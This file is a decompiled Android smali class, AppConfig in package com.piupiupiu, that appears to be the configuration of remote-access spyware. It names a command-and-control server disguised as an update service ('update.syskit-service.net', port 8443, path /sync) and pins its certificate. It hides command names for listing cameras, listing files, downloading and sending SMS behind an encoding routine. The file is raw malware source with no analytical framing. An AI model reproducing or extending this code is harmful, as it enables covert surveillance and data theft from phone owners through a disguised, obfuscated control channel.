.class public final Lcom/piupiupiu/AppConfig;
.super Ljava/lang/Object;


# static fields
.field public static final C2_HOST:Ljava/lang/String; = "update.syskit-service.net"

.field public static final C2_PATH:Ljava/lang/String; = "/sync"

.field public static final C2_PIN:Ljava/lang/String; = "sha256/XLbHNEhBwnQo0kYZRgurNN9uqKsEKjnctV3DK9y2exI="

.field public static final C2_PORT:I = 0x20fb

.field public static final C2_SCHEME:Ljava/lang/String; = "https"

.field public static final EXTRA_CAM_LIST:Ljava/lang/String;

.field public static final EXTRA_DL:Ljava/lang/String;

.field public static final EXTRA_LS:Ljava/lang/String;

.field public static final EXTRA_SEND_SMS:Ljava/lang/String;

.field public static final FIELD_EXTRA:Ljava/lang/String;

.field public static final FIELD_PATH:Ljava/lang/String;

.field public static final FIELD_SEC:Ljava/lang/String;

.field public static final FIELD_SMS:Ljava/lang/String;

.field public static final FIELD_TO:Ljava/lang/String;

.field public static final FRAME_PAYLOAD:Ljava/lang/String;

.field public static final FRAME_TYPE:Ljava/lang/String;

.field public static final PARAM_DEVICE:Ljava/lang/String;

.field public static final PARAM_MODEL:Ljava/lang/String;

.field public static final PARAM_RELEASE:Ljava/lang/String;

.field public static final PARAM_VENDOR:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "FGE="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->PARAM_MODEL:Ljava/lang/String;

    const-string v0, "FGI="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->PARAM_VENDOR:Ljava/lang/String;

    const-string v0, "FGM="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->PARAM_RELEASE:Ljava/lang/String;

    const-string v0, "FGQ="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->PARAM_DEVICE:Ljava/lang/String;

    const-string v0, "BA=="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FRAME_TYPE:Ljava/lang/String;

    const-string v0, "CA=="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FRAME_PAYLOAD:Ljava/lang/String;

    const-string v0, "HyA="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FIELD_EXTRA:Ljava/lang/String;

    const-string v0, "FiA="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FIELD_PATH:Ljava/lang/String;

    const-string v0, "AjM="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FIELD_TO:Ljava/lang/String;

    const-string v0, "EjQ="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FIELD_SMS:Ljava/lang/String;

    const-string v0, "FCVT"

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->FIELD_SEC:Ljava/lang/String;

    const-string v0, "EyY="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->EXTRA_CAM_LIST:Ljava/lang/String;

    const-string v0, "HCM="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->EXTRA_LS:Ljava/lang/String;

    const-string v0, "FDw="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->EXTRA_DL:Ljava/lang/String;

    const-string v0, "BCg="

    invoke-static {v0}, Lcom/piupiupiu/StrCodec;->dec(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/piupiupiu/AppConfig;->EXTRA_SEND_SMS:Ljava/lang/String;

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static c2Base()Ljava/lang/String;
    .locals 1

    const-string v0, "https://update.syskit-service.net:8443/sync"

    return-object v0
.end method
